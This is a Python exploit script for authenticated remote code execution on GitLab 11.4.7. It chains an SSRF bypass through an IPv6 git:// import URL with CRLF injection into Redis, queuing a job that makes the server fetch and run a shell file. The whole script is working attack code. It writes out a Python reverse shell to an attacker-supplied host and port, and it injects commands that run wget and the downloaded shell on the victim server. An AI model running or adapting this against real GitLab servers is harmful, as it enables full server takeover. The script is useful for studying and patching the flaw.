# Exploit Title: GitLab 11.4.7 Authenticated Remote Code Execution (No Interaction Required)
# Date: 15th December 2020
# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
# Software Link: https://about.gitlab.com/
# POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
# Tested on: GitLab 11.4.7 CE
# CVE : CVE-2018-19571 (SSRF),CVE-2018-19585 (CRLF)

import requests
import re
import warnings
from bs4 import BeautifulSoup
import sys
import base64
import urllib
from random_words import RandomWords
import argparse
import os
import time




parser = argparse.ArgumentParser(description='GitLab 11.4.7 Authenticated RCE')
parser.add_argument('-U',help='GitLab Username')
parser.add_argument('-P',help='Gitlab Password')
parser.add_argument('-l',help='rev shell lhost')
parser.add_argument('-p',help='rev shell lport ',type=int)
args = parser.parse_args()


username = args.U
password = args.P
lhost = args.l
lport = args.p


#Retrieve CSRF Token

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
gitlab_url = "http://10.129.49.62:5080"
request = requests.Session()
print("[+] Retrieving CSRF token to submit the login form")
time.sleep(1)
page = request.get(gitlab_url+"/users/sign_in")
html_content = page.text
soup = BeautifulSoup(html_content,features="lxml")
token = soup.findAll('meta')[16].get("content")


print("[+] CSRF Token : "+token)
time.sleep(1)


#Login

login_info ={
            "authenticity_token": token,
            "user[login]": username,
            "user[password]": password,
            "user[remember_me]": "0"
}


login_request = request.post(gitlab_url+"/users/sign_in",login_info)


if login_request.status_code==200:
	print("[+] Login Successful")
	time.sleep(1)

else:

	print("Login Failed")
	print(" ")
	sys.exit()




#Exploitation

print("[+] Running Exploit")
time.sleep(1)
print("[+] Using IPV6 URL 'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git' to bypass filter")
time.sleep(1)

ipv6_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2Fssrf.git"


r = RandomWords()
project_name = r.random_word()
project_url = '%s/%s/'%(gitlab_url,username)

print("[+] Creating Project")
time.sleep(1)
print("[+] Project Name : "+project_name)
time.sleep(1)

print("[+] Creating Python Reverse Shell")
time.sleep(1)


python_shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'%(lhost,lport)


os.system("touch shell.py")
shell_file = open("shell.py","w")
shell_file.write(python_shell)
shell_file.close()


print("[+] Reverse Shell Generated")
time.sleep(1)

print("[+] Start HTTP Server in current directory")


print("Command : python3 -m http.server 80")
time.sleep(2)

http_server = raw_input("Continue (Y/N) : ")

if (http_server=="N") or (http_server=="n"):
	print("Start HTTP Server before running exploit")

elif (http_server=="Y") or (http_server=="y"):

	
	
	print("Run this script twice with options below to get SHELL!")
	print("")
	print("Option 1 : Download shell.py rev shell to server using wget")
	print("Option 2 : Execute shell.py downloaded previously")

	option = raw_input("Option (1/2) : ")


	if option=="1":



		reverse_shell= """\nmulti
		 sadd resque:gitlab:queues system_hook_push
		 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|setsid wget http://%s/shell.py \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
		 exec
		 exec
		 exec\n""" %(lhost)
		 
		 
		project_page = request.get(gitlab_url+"/projects/new")
		html_content = project_page.text
		soup = BeautifulSoup(html_content,features="lxml")
		project_token = soup.findAll('meta')[16].get("content")
		namespace_id = soup.find('input', {'name': 'project[namespace_id]'}).get('value')
		urlencoded_token1 = project_token.replace("==","%3D%3D")
		urlencoded_token_final = urlencoded_token1.replace("+","%2B")
		

		payload=b"utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)






		proxies = {
			"http" : "http://127.0.0.1:8080",
		     	"https" : "https://127.0.0.1:8080",
			    }
			    
		cookies = {
		    'sidebar_collapsed': 'false',
		    'event_filter': 'all',
		    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
		    '_gitlab_session':request.cookies['_gitlab_session'],
		}

		headers = {
		    'Host': '10.129.49.31:5080',
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		    'Accept-Language': 'en-US,en;q=0.5',
		    'Accept-Encoding': 'gzip, deflate',
		    'Referer': 'http://10.129.49.31:5080/projects',
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'Content-Length': '398',
		    'Connection': 'close',
		    'Upgrade-Insecure-Requests': '1',
		}



		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)

		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
		print("[+] Success!")
		time.sleep(1)
		print("[+] Run Exploit with Option 2")
		
		
	elif option=="2":

		reverse_shell= """\nmulti
		 sadd resque:gitlab:queues system_hook_push
		 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|setsid python3 shell.py \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
		 exec
		 exec
		 exec\n"""
		 



		project_page = request.get(gitlab_url+"/projects/new")
		html_content = project_page.text
		soup = BeautifulSoup(html_content,features="lxml")
		project_token = soup.findAll('meta')[16].get("content")
		namespace_id = soup.find('input', {'name': 'project[namespace_id]'}).get('value')
		urlencoded_token1 = project_token.replace("==","%3D%3D")
		urlencoded_token_final = urlencoded_token1.replace("+","%2B")


		payload=b"utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)






		proxies = {
			"http" : "http://127.0.0.1:8080",
		     	"https" : "https://127.0.0.1:8080",
			    }
			    
		cookies = {
		    'sidebar_collapsed': 'false',
		    'event_filter': 'all',
		    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
		    '_gitlab_session':request.cookies['_gitlab_session'],
		}

		headers = {
		    'Host': '10.129.49.31:5080',
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		    'Accept-Language': 'en-US,en;q=0.5',
		    'Accept-Encoding': 'gzip, deflate',
		    'Referer': 'http://10.129.49.31:5080/projects',
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'Content-Length': '398',
		    'Connection': 'close',
		    'Upgrade-Insecure-Requests': '1',
		}



		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)

		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
		print("[+] Success!")
		time.sleep(1)
		print("[+] Spawning Reverse Shell")